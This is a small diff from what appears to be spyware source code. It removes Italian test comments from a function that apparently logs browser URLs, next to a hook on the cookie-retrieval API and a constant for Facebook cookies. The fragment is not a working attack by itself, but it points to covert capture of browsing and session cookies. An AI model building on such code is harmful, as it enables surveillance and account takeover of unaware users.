@@ -495,10 +495,6 @@ DWORD PM_InternetGetCookieEx_setup(HMServiceStruct *pData)
 
 DWORD __stdcall PM_UrlLogDispatch(BYTE * msg, DWORD dwLen, DWORD dwFlags, FILETIME *dummy)
 {
-	// XXX
-	// Test che vadano intanto gli URL di explorer e degli altri browser
-	// Testo con e senza ricordati di me su tutti e 3 i social network
-
 	DWORD origin = COOKIE_MASK;
 	DWORD size = sizeof(FACEBOOK_IE_COOKIE)-sizeof(WCHAR);
 	origin = dwFlags & (~origin);
